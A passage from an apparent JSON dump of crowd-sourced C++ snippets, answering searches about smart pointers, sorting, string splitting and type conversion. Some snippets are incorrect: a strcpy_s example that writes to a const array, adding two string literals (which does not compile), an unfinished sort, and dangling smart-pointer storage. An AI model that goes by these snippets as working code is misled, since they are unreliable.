    "description": "#include <iostream> #include <memory> using namespace std;  int main(){ \t//this just builds a 2D array pi that looks like \t//0 1 2 3 4 \t//5 6 7 8 9 \t//10 11 12 13 \t//...\t   24 \tint** pi=new int*[5]; \t \t//this counter is augmented by 5 in every loop, \t//for the value to be 0...,5,..10etc \tint counter=0; \tfor(int j=0;j<5;j++){\t \t\tint* i=new int[5]; \t\tfor(int j=0;j<5;j++) \t\t\ti[j]=j+counter; \t\tcounter=counter+5;  \t\tpi[j]=i; \t\t//just to print out the array \t\tfor(int k=0;k<5;k++) \t\t\tcout<<pi[j][k]<<\" \"; \t\tcout<<endl; \t} \tcout<<endl;  \t//trying the same thing using smart pointers \tunique_ptr<int*[]> smp_pi(new int*[5]); \tcounter=0;\t \tfor(int j=0;j<5;j++){ \t\tunique_ptr<int[]> smp_i(new int[5]);\t\t \t\tfor(int k=0;k<5;k++){ \t\t\tsmp_i[k]=counter+k;\t\t \t\t\tcout<<smp_i[k]<<\" \"; \t\t} \t\tcounter=counter+5; \t\tcout<<endl; \t\tsmp_pi[j]=&smp_i[0]; \t\t//smp_pi[j]=smp_i; //this does not compile. why? \t} \tcout<<endl;  \tfor(int j=0;j<5;j++){\t \t\tfor(int k=0;k<5;k++) \t\t\tcout<<smp_pi[j][k]<<\" \"; \t\tcout<<endl; \t}  \treturn 0; }\n",
    "reg_date": "2021-10-12T11:38:37.000Z"
  },
  {
    "id": 1204,
    "keyword": null,
    "link": null,
    "title": " c++ smartpointer",
    "description": "#include <memory>   void my_func() {     std::unique_ptr<int> valuePtr(new int(15));     int x = 45;     // ...     if (x == 45)         return;   // no memory leak anymore!     // ... }   int main() { }\n",
    "reg_date": "2021-10-12T11:38:37.000Z"
  },
  {
    "id": 1205,
    "keyword": null,
    "link": null,
    "title": " c++ sort",
    "description": "// C++ program to demonstrate default behaviour of  // sort() in STL.  #include <bits/stdc++.h>  using namespace std;     int main()  {      int arr[] = {1, 5, 8, 9, 6, 7, 3, 4, 2, 0};      int n = sizeof(arr)/sizeof(arr[0]);         sort(arr, arr+n);         cout << \"\\nArray after sorting using \"          \"default sort is : \\n\";      for (int i = 0; i < n; ++i)          cout << arr[i] << \" \";         return 0;  } \n#include <bits/stdc++.h>  using namespace std;   #define size(arr) sizeof(arr)/sizeof(arr[0]);   int main(){      int a[5] = {5, 2, 6,3 ,5};     int n = size(a);     sort((a), a + n);     for(int i = 0; i < n; i++){         cout << a[i];     }       return 0;  } \n int arr[]= {2,3,5,6,1,2,3,6,10,100,200,0,-10};     int n = sizeof(arr)/sizeof(int);       sort(arr,arr+n);      for(int i: arr)     {         cout << i << \" \";     } \nsort(arr, arr+n); // sorts in ascending order\n#include<bits/stdc++.h>  vector<int> v = { 6,1,4,5,2,3,0}; sort(v.begin() , v.end()); // {0,1,2,3,4,5,6} sorts ascending sort(v.begin(), v.end(), greater<int>()); // {6,5,4,3,2,1,0} sorts descending\n",
    "reg_date": "2021-10-12T11:38:37.000Z"
  },
  {
    "id": 1206,
    "keyword": null,
    "link": null,
    "title": " c++ sort array of ints",
    "description": "// C++ program to demonstrate default behaviour of  // sort() in STL.  #include <bits/stdc++.h>  using namespace std;     int main()  {      int arr[] = {1, 5, 8, 9, 6, 7, 3, 4, 2, 0};      int n = sizeof(arr)/sizeof(arr[0]);         sort(arr, arr+n);         cout << \"\\nArray after sorting using \"          \"default sort is : \\n\";      for (int i = 0; i < n; ++i)          cout << arr[i] << \" \";         return 0;  } \n",
    "reg_date": "2021-10-12T11:38:37.000Z"
  },
  {
    "id": 1207,
    "keyword": null,
    "link": null,
    "title": " c++ sort code",
    "description": "vector <int> vect; //any container vector <int>::iterator start = vect.begin(), end=vect.end(); //iterator for the begin and end of the container sort (start,end); //std::sort (increasing order) sort (start,end,greater<int>()); //std::sort (decreasing order)\nsort(arr, arr+length); //increase sort(arr, arr+length, greater<int>()); //decrease \n int arr[]= {2,3,5,6,1,2,3,6,10,100,200,0,-10};     int n = sizeof(arr)/sizeof(int);       sort(arr,arr+n);      for(int i: arr)     {         cout << i << \" \";     } \n#include <iostream> 2 #include <array> 3 #include <string> 4 #include <algorithm> 5 6 using namespace std; 7 8 int main(){ 9 array<string, 4> colours = {\"blue\", \"black\", \"red\", \"green\"}; 10 for (string colour : colours){ 11 cout << colour << ' '; 12 } 13 cout << endl; 14 sort(colours.begin(), colours.end()); 15 for (string colour : colours){ 16 cout << colour << ' '; 17 } 18 return 0; 19 } 66 20 21 /* 22 Output: 23 blue black red green 24 black blue green red 25 */\n",
    "reg_date": "2021-10-12T11:38:37.000Z"
  },
  {
    "id": 1208,
    "keyword": null,
    "link": null,
    "title": " c++ sort function time complexity",
    "description": "nlog(n)\n#include<iostream>   using namespace std;   int main ()   {         int myarray[10] = { 12,4,3,1,15,45,33,21,10,2};                cout<<\"\\nInput list is \\n\";     for(int i=0;i<10;i++)       {           cout <<myarray[i]<<\"\\t\";       }         for(int k=1; k<10; k++)        {           int temp = myarray[k];           int j= k-1;           }  \n",
    "reg_date": "2021-10-12T11:38:37.000Z"
  },
  {
    "id": 1209,
    "keyword": null,
    "link": null,
    "title": " c++ sort map by value",
    "description": "#include <iostream> #include <map> #include <vector> #include <algorithm>   typedef std::pair<std::string, int> pair;   int main() {     // input map     std::map<std::string, int> map = {         {\"two\", 2}, {\"one\", 1}, {\"four\", 4}, {\"three\", 3}     };       // create an empty vector of pairs     std::vector<pair> vec;       // copy key-value pairs from the map to the vector     std::copy(map.begin(),             map.end(),             std::back_inserter<std::vector<pair>>(vec));       // sort the vector by increasing the order of its pair's second value     // if the second value is equal, order by the pair's first value     std::sort(vec.begin(), vec.end(),             [](const pair &l, const pair &r)             {                 if (l.second != r.second) {                     return l.second < r.second;                 }                   return l.first < r.first;             });       // print the vector     for (auto const &pair: vec) {         std::cout << '{' << pair.first << \",\" << pair.second << '}' << std::endl;     }       return 0; }\n",
    "reg_date": "2021-10-12T11:38:38.000Z"
  },
  {
    "id": 1210,
    "keyword": null,
    "link": null,
    "title": " c++ sort numbers by magnitude/absolute value",
    "description": "// sort numbers by their magnitude value bool sortByAbsolute(int a, int b) {     return abs(a) < abs(b); }  void find(std::vector<int> &nums, std::vector<int> &sorted) {     std::sort(nums.begin(), nums.end(), sortByAbsolute); }\n",
    "reg_date": "2021-10-12T11:38:38.000Z"
  },
  {
    "id": 1211,
    "keyword": null,
    "link": null,
    "title": " c++ sorting and keeping track of indexes",
    "description": "#include <iostream> #include <vector> #include <numeric>      // std::iota #include <algorithm>    // std::sort, std::stable_sort  using namespace std;  template <typename T> vector<size_t> sort_indexes(const vector<T> &v) {    // initialize original index locations   vector<size_t> idx(v.size());   iota(idx.begin(), idx.end(), 0);    // sort indexes based on comparing values in v   // using std::stable_sort instead of std::sort   // to avoid unnecessary index re-orderings   // when v contains elements of equal values    stable_sort(idx.begin(), idx.end(),        [&v](size_t i1, size_t i2) {return v[i1] < v[i2];});    return idx; }\n",
    "reg_date": "2021-10-12T11:38:38.000Z"
  },
  {
    "id": 1212,
    "keyword": null,
    "link": null,
    "title": " c++ split at character",
    "description": "std::stringstream test(\"this_is_a_test_string\"); std::string segment; std::vector<std::string> seglist;  while(std::getline(test, segment, '_')) {    seglist.push_back(segment); //Spit string at '_' character }\n",
    "reg_date": "2021-10-12T11:38:38.000Z"
  },
  {
    "id": 1213,
    "keyword": null,
    "link": null,
    "title": " c++ split string by comma into array",
    "description": "#include <vector> #include <string> #include <sstream> #include <iostream> using namespace std;  int main() {     string s=\"i,love,my,country,very,much\";   //declare a string     string answer[6];  // string array to store the result     stringstream string_stream(s);  // creating string stream object \tint i=0;            // declaring i and assign  to 0     \twhile(string_stream.good())   // loop will continue if string stream is error free \t{ \t\tstring a;        \t\tgetline( string_stream, a, ',' );   //calling getline fuction \t\tanswer[i]=a; \t\ti++; \t}     \tfor(i=0;i<6;i++) \t{ \t\tcout<<answer[i]<<endl;   // printing a result \t}     return 0; }\n",
    "reg_date": "2021-10-12T11:38:38.000Z"
  },
  {
    "id": 1214,
    "keyword": null,
    "link": null,
    "title": " c++ split string by several space",
    "description": "std::string s = \"split on    whitespace   \";  std::vector<std::string> result;  std::istringstream iss(s);  for(std::string s; iss >> s; )      result.push_back(s); \n",
    "reg_date": "2021-10-12T11:38:38.000Z"
  },
  {
    "id": 1215,
    "keyword": null,
    "link": null,
    "title": " c++ stack and queue",
    "description": "#include <iostream> #include <stack>  #include <queue> using namespace std;  void printStack(stack<int> custstack) {     for(int i = 0; i < 3; i++)     {         int y = custstack.top();         cout << y << endl;         custstack.pop();     } }  void printQueue(queue<int> custqueue) {     for(int i = 0; i < 3; i++)     {         int y = custqueue.front();         cout << y << endl;         custqueue.pop();     } }  int main () {     cout << \"Stack:\" << endl;     // this stack stacks three elements one by one and displays each element before its removal     stack<int> MY_STACK; // define stack and initialize to 3 elements     MY_STACK.push(69); // last element popped / displayed     MY_STACK.push(68); // second element popped / displayed     MY_STACK.push(67); // third popped/displayed     printStack(MY_STACK);      cout << endl << \"Switching to queue\" << endl;      queue<int> MY_QUEUE;     MY_QUEUE.push(69); // first out     MY_QUEUE.push(68); // second out      MY_QUEUE.push(67); // third out     printQueue(MY_QUEUE);     return 0; }\n",
    "reg_date": "2021-10-12T11:38:38.000Z"
  },
  {
    "id": 1216,
    "keyword": null,
    "link": null,
    "title": " c++ standard library source",
    "description": "The GNU project is Free and Open Source software, and contains an implementation of the C++ standard library.  http://gcc.gnu.org/libstdc++/\n",
    "reg_date": "2021-10-12T11:38:38.000Z"
  },
  {
    "id": 1217,
    "keyword": null,
    "link": null,
    "title": " c++ start process and get output",
    "description": "#include <cstdio> #include <iostream> #include <memory> #include <stdexcept> #include <string> #include <array>  std::string exec(const char* cmd) {     std::array<char, 128> buffer;     std::string result;     std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, \"r\"), pclose);     if (!pipe) {         throw std::runtime_error(\"popen() failed!\");     }     while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {         result += buffer.data();     }     return result; } \n",
    "reg_date": "2021-10-12T11:38:38.000Z"
  },
  {
    "id": 1218,
    "keyword": null,
    "link": null,
    "title": " c++ start thread later",
    "description": "#include <iostream> #include <thread>  void thread_func(const int i) {     std::cout << \"hello from thread: \" << i << std::endl; }  int main() {     std::thread t;      t = std::thread{ thread_func, 7 };     t.join(); }\n",
    "reg_date": "2021-10-12T11:38:38.000Z"
  },
  {
    "id": 1219,
    "keyword": null,
    "link": null,
    "title": " c++ static array in Klasse",
    "description": "// Declare in Header- File: class A { \tchar a[6] = {1,2,3,4,5,6}; }  // Define in fitting .cpp file char A::a[6] = {1,2,3,4,5,6};\n",
    "reg_date": "2021-10-12T11:38:38.000Z"
  },
  {
    "id": 1220,
    "keyword": null,
    "link": null,
    "title": " c++ std::copy to cout",
    "description": "//it_start and it_end are the start and end iterators of your container //(ie. vec.begin() and vec.end()) //T is the type of your container (for example, for a std::vector<int> then //T is int) //separator is a string that will be inserted between each element  std::copy(it_start, it_end, std::ostream_iterator<T>(std::cout, separator));\n",
    "reg_date": "2021-10-12T11:38:39.000Z"
  },
  {
    "id": 1221,
    "keyword": null,
    "link": null,
    "title": " c++ std::find with lambda",
    "description": "std::find_if(     myVector.begin(), myVector.end(),     [&toFind](const MyStruct& x) { return x.m_id == toFind.m_id;});\n",
    "reg_date": "2021-10-12T11:38:39.000Z"
  },
  {
    "id": 1222,
    "keyword": null,
    "link": null,
    "title": " c++ std::fmin",
    "description": "#include <iostream> #include <cmath>   int main() {     std::cout << \"fmin(2,1)    = \" << std::fmin(2,1) << '\\n'               << \"fmin(-Inf,0) = \" << std::fmin(-INFINITY,0) << '\\n'               << \"fmin(NaN,-1) = \" << std::fmin(NAN,-1) << '\\n'; }\n",
    "reg_date": "2021-10-12T11:38:39.000Z"
  },
  {
    "id": 1223,
    "keyword": null,
    "link": null,
    "title": " c++ std::pair",
    "description": "// make_pair example #include <utility>      // std::pair #include <iostream>     // std::cout  int main () {   std::pair <int,int> foo;   std::pair <int,int> bar;    foo = std::make_pair (10,20);   bar = std::make_pair (10.5,'A'); // ok: implicit conversion from pair<double,char>    std::cout << \"foo: \" << foo.first << \", \" << foo.second << '\\n';   std::cout << \"bar: \" << bar.first << \", \" << bar.second << '\\n';    return 0; }\n// pair::pair example #include <utility>      // std::pair, std::make_pair #include <string>       // std::string #include <iostream>     // std::cout  int main () {   std::pair <std::string,double> product1;                     // default constructor   std::pair <std::string,double> product2 (\"tomatoes\",2.30);   // value init   std::pair <std::string,double> product3 (product2);          // copy constructor    product1 = std::make_pair(std::string(\"lightbulbs\"),0.99);   // using make_pair (move)   return 0; }\n",
    "reg_date": "2021-10-12T11:38:39.000Z"
  },
  {
    "id": 1224,
    "keyword": null,
    "link": null,
    "title": " c++ std map initializer list",
    "description": "std::map <int, std::string> x {    { 42, \"foo\" },    { 3, \"bar\" }  }; \n",
    "reg_date": "2021-10-12T11:38:39.000Z"
  },
  {
    "id": 1225,
    "keyword": null,
    "link": null,
    "title": " c++ std string to float",
    "description": "#include <iostream> #include <string>  int main() {     std::string str = \"123.4567\";      // convert string to float     float num_float = std::stof(str);      // convert string to double     double num_double = std::stod(str);     std:: cout<< \"num_float = \" << num_float << std::endl;    std:: cout<< \"num_double = \" << num_double << std::endl;      return 0; }\nstd::string num = \"0.6\"; double temp = ::atof(num.c_str());  std::cout << temp << std::endl; // Output: 0.6\n",
    "reg_date": "2021-10-12T11:38:39.000Z"
  },
  {
    "id": 1226,
    "keyword": null,
    "link": null,
    "title": " c++ stl sort",
    "description": " // STL IN C++ FOR SORING #include <bits/stdc++.h>  #include <iostream>  using namespace std;  int main()  {      int arr[] = {1, 5, 8, 9, 6, 7, 3, 4, 2, 0};      int n = sizeof(arr)/sizeof(arr[0]);      sort(arr, arr+n);  // ASCENDING SORT     reverse(arr,arr+n);   //REVERESE ARRAY      sort(arr, arr + n, greater<int>());// DESCENDING SORT   } \nsort(arr, arr+length); //increase sort(arr, arr+length, greater<int>()); //decrease \n int arr[]= {2,3,5,6,1,2,3,6,10,100,200,0,-10};     int n = sizeof(arr)/sizeof(int);       sort(arr,arr+n);      for(int i: arr)     {         cout << i << \" \";     } \nsort(arr, arr+n); // sorts in ascending order\nsort(arr, arr+n, greater<int>()); // sorts in descending order\n// sort algorithm example #include <iostream>     // std::cout #include <algorithm>    // std::sort #include <vector>       // std::vector  bool myfunction (int i,int j) { return (i<j); }  struct myclass {   bool operator() (int i,int j) { return (i<j);} } myobject;  int main () {   int myints[] = {32,71,12,45,26,80,53,33};   std::vector<int> myvector (myints, myints+8);               // 32 71 12 45 26 80 53 33    // using default comparison (operator <):   std::sort (myvector.begin(), myvector.begin()+4);           //(12 32 45 71)26 80 53 33    // using function as comp   std::sort (myvector.begin()+4, myvector.end(), myfunction); // 12 32 45 71(26 33 53 80)    // using object as comp   std::sort (myvector.begin(), myvector.end(), myobject);     //(12 26 32 33 45 53 71 80)    // print out content:   std::cout << \"myvector contains:\";   for (std::vector<int>::iterator it=myvector.begin(); it!=myvector.end(); ++it)     std::cout << ' ' << *it;   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:38:39.000Z"
  },
  {
    "id": 1227,
    "keyword": null,
    "link": null,
    "title": " c++ strcpy s",
    "description": "//When to use strcpy_s: //\tUse strcpy_s to copy a const char[] array in read and write memory //How to use strcpy_s:  //The location where the array is going to be copied to char* ptrToArray = new char[sizeof(testArray)]  //The Array that gets copied To ptrToArray; const char[] testArray = \"Test Array\";  strcpy_s(ptrToArray, sizeof(testArray), testArray);  //Modify the copied array testArray[i] = 'A' \n",
    "reg_date": "2021-10-12T11:38:39.000Z"
  },
  {
    "id": 1228,
    "keyword": null,
    "link": null,
    "title": " c++ stream string into fiel",
    "description": "string filetostring(){ \tifstream file(\"file\", ios::binary);     string fileStr;      istreambuf_iterator<char> inputIt(file), emptyInputIt;     back_insert_iterator<string> stringInsert(fileStr);      copy(inputIt, emptyInputIt, stringInsert);      return fileStr; }\n#include <fstream> #include <string> #include <iostream>  int main() {     std::string input;     std::cin >> input;     std::ofstream out(\"output.txt\");     out << input;     out.close();     return 0; }\n",
    "reg_date": "2021-10-12T11:38:39.000Z"
  },
  {
    "id": 1229,
    "keyword": null,
    "link": null,
    "title": " c++ strict function return checking",
    "description": "#pragma GCC diagnostic error \"-Wreturn-type\"\n",
    "reg_date": "2021-10-12T11:38:39.000Z"
  },
  {
    "id": 1230,
    "keyword": null,
    "link": null,
    "title": " c++ string::length vs size",
    "description": "// C++ string size str.length(); str.size();\t\t\t// synonym\n",
    "reg_date": "2021-10-12T11:38:40.000Z"
  },
  {
    "id": 1231,
    "keyword": null,
    "link": null,
    "title": " c++ string",
    "description": "std::string str = \"hello world\";  char *str = \"hello world\"; char str[] = \"hello world\";  char str[11] = \"hello world\"; \n// Include the string library #include <string>  // Create a string variable string greeting = \"Hello\";\n#include <iostream> #include <string>//for printing std::string int main()  { \t//A string is a group of characters and an array of const chars \tconst char* name = \"Caleb\";//C style string \t//how string actually works below: \t//String without null terminating character below:  \tchar name2[5] = { 'C','a','l','e','b' };// string is just an array of characters \t//The above doesn't have an null termination character at the end cout will not now where the string ends and will acess memory that is not a part of your string \tstd::cout << name2 << std::endl;//output => Caleb + somejunk //this is because null terminating char is not present at the end of array \t//String with null terminating character below:  \tchar name3[6] = { 'C','a','l','e','b','\\0' };//null terminating char '\\0' or '0' can be used  \tstd::cout << name3 << std::endl;//output => Caleb // because null terminating char is present cout knows where array ends   \t//std::string class in c++ is takes an array of const chars and a bunch of functions to manuplate it: \t//std::string has a constructor  that takes const char array \tstd::string name4 = \"Caleb\"; \tname4.size();//gives size of string and there are many more methods in std::string class \t   //appending to std::string      \t//\"Ever thing inside these double quotes becomes const char array\"    //std::string namee = \"Caleb\" +\"Hello\";//This will give error because adding const char array to const char array  \tstd::string namee = \"Caleb\"; \tnamee += \" Hello\";//This will work because adding a ptr to a actual string \tstd::cout << namee << std::endl; //You can also use the below \tstd::string namee2 = std::string(\"Caleb\")+\" Hello\";// This will work because constructor will convert const char array  to string, adding a ptr to string \tstd::cout << namee2 << std::endl;     std::cin.get();  }\n#include <string>  std::string myString = \"Hello, World!\";\n#include <string> #include <iostream> #include <type_traits> #include <cstring>  int main() {   std::string str = \"Hello, there\";   std::cout << std::boolalpha   << str.capacity() << \", \" << str.size() << \", \" << std::strlen(str.data()) // 12, 12, 12   << '\\n' << std::is_same_v<std::string, std::basic_string<char>> // true   << '\\n' << str.front() + str.substr(1, 10) + str.back() // Hello there   << '\\n' << str[0] // H   << '\\n';      str += \"!\";    std::cout << str << '\\n'; // Hello, there!   str.erase(4, 4); // Hellhere!   str.pop_back(); // Hellhere   str.insert(4, \" \"); // Hell here   std::cout << str << '\\n'; // Hell here    }\n// you want to include <string> #include <string> #include <iostream>  int main()  {   string helloWorld = \"Hello World!\"; // creating string and assigning   std::cout << helloWorld;            // will output what you assigned it!                                       /* you can also use strings with user                                        input (cin/getline)*/   string namePerson{};   getline(cin, namePerson); // getline allows for multi word input   std::cout << namePerson;  // outputs name which person inputted }\n",
    "reg_date": "2021-10-12T11:38:40.000Z"
  },
  {
    "id": 1232,
    "keyword": null,
    "link": null,
    "title": " c++ string concatenation",
    "description": "// with C++11 string result = name + std::to_string(age);\n#include <iostream> #include <cstdlib>  std::string text = \"hello\"; std::string moretext = \"there\"; std::string together = text + moretext; std::cout << together << std::endl;  >> hello there\n#include <iostream> using namespace std;  int main() {     string s1, s2, result;      cout << \"Enter string s1: \";     getline (cin, s1);      cout << \"Enter string s2: \";     getline (cin, s2);      result = s1 + s2;      cout << \"Resultant String = \"<< result;      return 0; } \n#include <iostream> #include <sstream>  int main() {   std::string value = \"Hello, \" + \"world!\";   std::cout << value << std::endl;    //Or you can use ostringstream and use integers too   //For example:    std::ostringstream ss;   ss << \"This is an integer\" << 104;   std::cout << ss.str() << std::endl; }\nstring first_name = \"foo\" string last_name = \"bar\" std::cout << first_name + \" \" + last_name << std::endl;\nlet str = 'Hello'; str += ' '; str += 'World'; str; // 'Hello World'\n",
    "reg_date": "2021-10-12T11:38:40.000Z"
  },
  {
    "id": 1233,
    "keyword": null,
    "link": null,
    "title": " c++ string contains",
    "description": "if (string1.find(string2) != std::string::npos) {     std::cout << \"found!\" << '\\n'; }\nif (s1.find(s2) != std::string::npos) {     std::cout << \"found!\" << '\\n'; }\n#include <iostream> #include <string> #include <algorithm> #include <functional>  int main() {     std::string in = \"Lorem ipsum dolor sit amet, consectetur adipiscing elit,\"                      \" sed do eiusmod tempor incididunt ut labore et dolore magna aliqua\";     std::string needle = \"pisci\";     auto it = std::search(in.begin(), in.end(),                    std::boyer_moore_searcher(                        needle.begin(), needle.end()));     if(it != in.end())         std::cout << \"The string \" << needle << \" found at offset \"                   << it - in.begin() << '\\n';     else         std::cout << \"The string \" << needle << \" not found\\n\"; }\n",
    "reg_date": "2021-10-12T11:38:40.000Z"
  },
  {
    "id": 1234,
    "keyword": null,
    "link": null,
    "title": " c++ string element access",
    "description": "#include <string> #include <iostream>  int main(){   //index string by using brackets []   std::string string = \"Hello, World!\";   //assign variable to string index   char stringindex = string[2];    }\n// string::operator[] #include <iostream> #include <string>  int main () {   std::string str (\"Test string\");   for (int i=0; i<str.length(); ++i)   {     std::cout << str[i];   }   return 0; }\nstring myString = \"Hello\"; cout << myString[0]; // Outputs H\n",
    "reg_date": "2021-10-12T11:38:40.000Z"
  },
  {
    "id": 1235,
    "keyword": null,
    "link": null,
    "title": " c++ string functions lowercase",
    "description": "transform(su.begin(), su.end(), su.begin(), ::toupper); transform(sl.begin(), sl.end(), sl.begin(), ::tolower); \n",
    "reg_date": "2021-10-12T11:38:40.000Z"
  },
  {
    "id": 1236,
    "keyword": null,
    "link": null,
    "title": " c++ string manipulation",
    "description": "std::string str = \"hello world\";  char *str = \"hello world\"; char str[] = \"hello world\";  char str[11] = \"hello world\"; \n#include <string>  std::string myString = \"Hello, World!\";\n/* OUTPUT String value: Programming    {where applicable: -31.05} ----------------------------------------------------------------------------- |Programming|            << [No manipulation] |         Programming|   << [Width:20][align:string_default=right] |         Programming|   << [Width:20][align:right] |Programming         |   << [Width:20][align:left] |-31.05              |   << [Width:20][align:int_default=left] |-              31.05|   << [Width:20][align:internal] |.........Programming|   << [Width:20][align:default][fill:.] |+++++++++Programming|   << [Width:20][align:default][fill:+] |=========Programming|   << [Width:20][align:default][fill:=] ----------------------------------------------------------------------------- */  string sString = \"Programming\"; // Length = 11  //NOTE: always place the settings before the actual string in cout  // width cout << \"|\" << sString << \"|\" << \"\\t\\t << [No manipulation]\" << endl; cout << \"|\" << setw(20) << sString << \"|\" << \"\\t << [Width:20][align:string_default=right]\\n\";  // alignment cout << \"|\" << setw(20) << right << sString << \"|\" << \"\\t << [Width:20][align:right]\\n\"; cout << \"|\" << setw(20) << left << sString << \"|\" << \"\\t << [Width:20][align:left]\\n\"; cout << \"|\" << setw(20) << -31.05 << \"|\" << \"\\t << [Width:20][align:int_default=left]\\n\"; cout << \"|\" << setw(20) << internal << -31.05 << \"|\" << \"\\t << [Width:20][align:internal]\\n\";  // fill (HAVE to use single quotes in the setfill argument definition) cout << \"|\" << setw(20) << setfill('.') << sString << \"|\" << \"\\t << [Width:20][align:default][fill:.]\\n\"; cout << \"|\" << setw(20) << setfill('+') << sString << \"|\" << \"\\t << [Width:20][align:default][fill:+]\\n\"; cout << \"|\" << setw(20) << setfill('=') << sString << \"|\" << \"\\t << [Width:20][align:default][fill:=]\\n\";\n#include <iostream>  int main() { \tstd::cout << \"Hello\" << std::endl; //endl = end line/new line     // or     printf(\"hello\");      }\n",
    "reg_date": "2021-10-12T11:38:40.000Z"
  },
  {
    "id": 1237,
    "keyword": null,
    "link": null,
    "title": " c++ string not printing",
    "description": "/* It is likely that you didn't actually update the size of your string you may have used the [] operator to add characters to the string, although you should use the += operator */\n",
    "reg_date": "2021-10-12T11:38:40.000Z"
  },
  {
    "id": 1238,
    "keyword": null,
    "link": null,
    "title": " c++ string on multiple lines",
    "description": "std::string firstWay =   \"This text is pretty long, but will be \"   \"concatenated into just a single string. \"   \"The disadvantage is that you have to quote \"   \"each part, and newlines must be literal as \"   \"usual.\";  //or you can place a \\ char just before the end of the line std::string secondWay =   \"Here, on the other hand, I've gone crazy \\ and really let the literal span several lines, \\ without bothering with quoting each line's \\ content. This works, but you can't indent.\"\nHow to cin c++ \n",
    "reg_date": "2021-10-12T11:38:40.000Z"
  },
  {
    "id": 1239,
    "keyword": null,
    "link": null,
    "title": " c++ string size",
    "description": "// string::length #include <iostream> #include <string>  int main () {   std::string str (\"Test string\");   std::cout << \"The size of str is \" << str.length() << \" bytes.\\n\";   return 0; }\n// C++ string size str.length(); str.size();\t\t\t// synonym\nstr.length();\n#include <string> #include <iostream>  int main() {     std::string s(21, '*');      std::cout << s << std::endl;      return 0; } \nstring str =\"hello world\";  //different ways to find length of a string:  str.length();  str.size();  \n// string::size #include <iostream> #include <string>  int main () {   std::string str (\"Test string\");   std::cout << \"The size of str is \" << str.size() << \" bytes.\\n\";   return 0; }\n",
    "reg_date": "2021-10-12T11:38:40.000Z"
  },
  {
    "id": 1240,
    "keyword": null,
    "link": null,
    "title": " c++ string split",
    "description": "std::stringstream test(\"this_is_a_test_string\"); std::string segment; std::vector<std::string> seglist;  while(std::getline(test, segment, '_')) {    seglist.push_back(segment); //Spit string at '_' character }\nvoid tokenize(string &str, char delim, vector<string> &out) { \tsize_t start; \tsize_t end = 0;  \twhile ((start = str.find_first_not_of(delim, end)) != string::npos) \t{ \t\tend = str.find(delim, start); \t\tout.push_back(str.substr(start, end - start)); \t} }  int main() {     string s=\"a;b;c\";     char d=';';     vector<string> a;     tokenize(s,d,a);     for(auto it:a)  cout<<it<<\" \";      return 0; }\nstd::vector<std::string> split_string(const std::string& str,                                       const std::string& delimiter) {     std::vector<std::string> strings;      std::string::size_type pos = 0;     std::string::size_type prev = 0;     while ((pos = str.find(delimiter, prev)) != std::string::npos)     {         strings.push_back(str.substr(prev, pos - prev));         prev = pos + 1;     }      // To get the last substring (or only, if delimiter is not found)     strings.push_back(str.substr(prev));      return strings; } \nstd::vector<std::string> &split(const std::string &s, char delim, std::vector<std::string> &elems) {     std::stringstream ss(s);     std::string item;     while(std::getline(ss, item, delim)) {         elems.push_back(item);     }     return elems; } \n// splits a std::string into vector<string> at a delimiter vector<string> split(string x, char delim = ' ') {     x += delim; //includes a delimiter at the end so last word is also read     vector<string> splitted;     string temp = \"\";     for (int i = 0; i < x.length(); i++)     {         if (x[i] == delim)         {             splitted.push_back(temp); //store words in \"splitted\" vector             temp = \"\";             i++;         }         temp += x[i];     }     return splitted; }\n#include <boost/algorithm/string.hpp>  std::string text = \"Let me split this into words\"; std::vector<std::string> results;  boost::split(results, text, [](char c){return c == ' ';});\n",
    "reg_date": "2021-10-12T11:38:41.000Z"
  },
  {
    "id": 1241,
    "keyword": null,
    "link": null,
    "title": " c++ string to char array",
    "description": "std::string myWord = \"myWord\"; char myArray[myWord.size()+1];//as 1 char space for null is also required strcpy(myArray, myWord.c_str());\nconst char *array = tmp.c_str(); //For const char array char *array = &tmp[0]; // If you need to modify the array\n",
    "reg_date": "2021-10-12T11:38:41.000Z"
  },
  {
    "id": 1242,
    "keyword": null,
    "link": null,
    "title": " c++ string to int",
    "description": "#include <iostream> #include <string>  int main() {      std::string str = \"123\";     int num;      // using stoi() to store the value of str1 to x     num = std::stoi(str);      std::cout << num;      return 0; }\nint thing = std::stoi(string);\n// For C++11 and later versions string str1 = \"45\";  string str2 = \"3.14159\";  string str3 = \"31337 geek\";   int myint1 = stoi(str1);  int myint2 = stoi(str2);  int myint3 = stoi(str3);   // Output stoi(\"45\") is 45 stoi(\"3.14159\") is 3 stoi(\"31337 geek\") is 31337 \n#include <iostream> #include <string> using namespace std; int main() {       string s = \"10\";       try     {         int i = stoi(s);         cout << i << '\\n';     }     catch (invalid_argument const &e)     {         cout << \"Bad input: std::invalid_argument thrown\" << '\\n';     }     catch (out_of_range const &e)     {         cout << \"Integer overflow: std::out_of_range thrown\" << '\\n';     }       return 0; }\natoi( str.c_str() )\n// EXAMPLE std::string sStringAsString = \"789\"; int iStringAsInt = atoi( sStringAsString.c_str() );  /* SYNTAX atoi( <your-string>.c_str() ) */  /* HEADERS #include <cstring> #include <string> */\n",
    "reg_date": "2021-10-12T11:38:41.000Z"
  },
  {
    "id": 1243,
    "keyword": null,
    "link": null,
    "title": " c++ string to integer without stoi",
    "description": "#include <iostream> #include <sstream>  using namespace std;  int main()  {     string s = \"999\";      stringstream degree(s);      int x = 0;     degree >> x;      cout << \"Value of x: \" << x; }\n",
    "reg_date": "2021-10-12T11:38:41.000Z"
  },
  {
    "id": 1244,
    "keyword": null,
    "link": null,
    "title": " c++ string to stream",
    "description": "// stringstream::str #include <string>       // std::string #include <iostream>     // std::cout #include <sstream>      // std::stringstream, std::stringbuf  int main () {   std::stringstream ss;   ss.str (\"Example string\");   std::string s = ss.str();   std::cout << s << '\\n';   return 0; }\n#include <fstream> #include <string> #include <iostream>  int main() {     std::string input;     std::cin >> input;     std::ofstream out(\"output.txt\");     out << input;     out.close();     return 0; }\n// EXAMPLE ostringstream ssTextAsStream(\"This is part of the stream.\"); // declare ostringstream string sTextAsString = ssTextAsStream.str(); // converted to string cout << sTextAsString << \"\\n\"; // printed out  /* SYNTAX <YourStringStream>.str() */  /* HEADERS #include <iostream> #include <sstream> using namespace std; */\n",
    "reg_date": "2021-10-12T11:38:41.000Z"
  },
  {
    "id": 1245,
    "keyword": null,
    "link": null,
    "title": " c++ string to vector int",
